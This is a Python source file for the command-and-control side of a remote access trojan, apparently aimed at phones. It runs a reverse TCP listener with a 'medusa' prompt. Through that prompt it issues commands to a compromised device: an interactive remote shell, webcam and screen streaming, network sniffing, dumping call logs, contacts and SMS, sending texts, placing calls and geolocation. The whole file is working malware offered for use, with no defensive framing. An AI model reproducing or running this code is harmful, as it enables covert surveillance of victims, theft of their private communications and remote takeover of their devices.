import socket
import threading
import time
import logging
from flask import Flask, Response
from colorama import Fore, Style, init
import cv2
import numpy as np
import sys
import os
import keyboard
from werkzeug.serving import make_server

# Initialize colorama and logging
init(autoreset=True)
logging.basicConfig(level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

app = Flask(__name__)
clients = {}
server_thread = None
streaming = False  # To track the streaming status
flask_server = None
client_socket_global = None  # Define a global variable for client_socket

class ServerThread(threading.Thread):
    def __init__(self, app):
        threading.Thread.__init__(self)
        self.srv = make_server('0.0.0.0', 5000, app)
        self.ctx = app.app_context()
        self.ctx.push()

    def run(self):
        self.srv.serve_forever()

    def shutdown(self):
        self.srv.shutdown()

@app.route('/')
def video_feed():
    global client_socket_global
    return Response(generate_frames(client_socket_global),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

def start_streaming(client_socket, mode, delay=0):
    global streaming, flask_server, client_socket_global
    streaming = True
    client_socket_global = client_socket  # Assign the client_socket to the global variable
    print(Fore.BLUE + "[ * ] Starting...")
    print(Fore.BLUE + "[ * ] Preparing player...")
    time.sleep(1)

    print(Fore.BLUE + f"[ * ] Opening player at: http://localhost:5000")
    print(Fore.BLUE + "[ * ] Streaming...")

    # Run the Flask app in a separate thread to handle the streaming
    flask_server = ServerThread(app)
    flask_server.start()

    # Start a thread to listen for CTRL+X key combination
    threading.Thread(target=listen_for_ctrl_x).start()

    # Stop streaming after delay
    if delay > 0:
        threading.Thread(target=stop_streaming_after_delay, args=(delay,)).start()

def stop_streaming_after_delay(delay):
    time.sleep(delay)
    print(Fore.RED + f"\n[ * ] Stopping streaming after {delay} seconds...")
    stop_flask_server()

def generate_frames(client_socket):
    while True:
        try:
            data = client_socket.recv(921600)
            if not data:
                break
            frame = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
            ret, buffer = cv2.imencode('.jpg', frame)
            frame = buffer.tobytes()
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
        except Exception as e:
            logging.error(f"Error generating frames: {e}")
            break

def listen_for_ctrl_x():
    global streaming, flask_server
    while streaming:
        if keyboard.is_pressed('ctrl+x'):
            print(Fore.RED + "\n[ * ] CTRL+X detected, stopping the Flask server and returning to prompt...")
            stop_flask_server()

def stop_flask_server():
    global streaming, flask_server
    streaming = False
    if flask_server:
        flask_server.shutdown()

def handle_client(client_socket, addr):
    target_ip, target_port = addr
    print(Fore.GREEN + f"[ * ] Metercrack session 1 opened (0.0.0.0:9999 -> {target_ip}:{target_port})")

    while True:
        try:
            command = input(Fore.MAGENTA + "medusa > ")
        except EOFError:
            break

        print(Fore.YELLOW + f"[ * ] Command '{command}' sent to client.")
        client_socket.send(command.encode('utf-8'))

        if command == "sniffer_start":
            print(Fore.YELLOW + "[ * ] Starting network sniffer on client...")
            continue
            
        if command == "shell":
            print(Fore.YELLOW + "[ * ] Entering interactive shell mode. Type 'exit' to leave.")
            while True:
                shell_command = input(Fore.CYAN + "shell > ")
                if shell_command.lower() == "exit":
                    print(Fore.YELLOW + "[ * ] Exiting shell mode.")
                    break
                client_socket.send(shell_command.encode('utf-8'))
                output = client_socket.recv(4096).decode('utf-8')
                print(Fore.WHITE + output)
            continue

        if command.startswith("webcam_stream") or command.startswith("screen_stream"):
            parts = command.split()
            mode = parts[0].split('_')[0]
            delay = 0
            if len(parts) > 1 and parts[1].startswith('--delay'):
                try:
                    delay = int(parts[1].split('=')[1])
                except (IndexError, ValueError):
                    print(Fore.RED + "[ * ] Invalid delay value, starting without delay.")
                    delay = 0
            start_streaming(client_socket, mode, delay)
            continue

        if command.startswith("dump_calllog"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        if command.startswith("dump_contacts"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        if command.startswith("dump_sms"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue
        
        if command.startswith("send_sms"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        if command.startswith("geolocate"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        if command.startswith("call"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        client_socket.send(command.encode('utf-8'))

def main():
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(('0.0.0.0', 9999))
        server_socket.listen(5)
        print(Fore.GREEN + "[ * ] Started reverse TCP handler on 0.0.0.0:9999")
        print(Fore.GREEN + "[ * ] Listening for incoming connections...")

        while True:
            client_socket, addr = server_socket.accept()
            print(Fore.GREEN + f"[ * ] Connection established from {addr}")
            client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
            client_handler.start()
    except Exception as e:
        logging.error(f"Error in main: {e}")

if __name__ == "__main__":
    main()
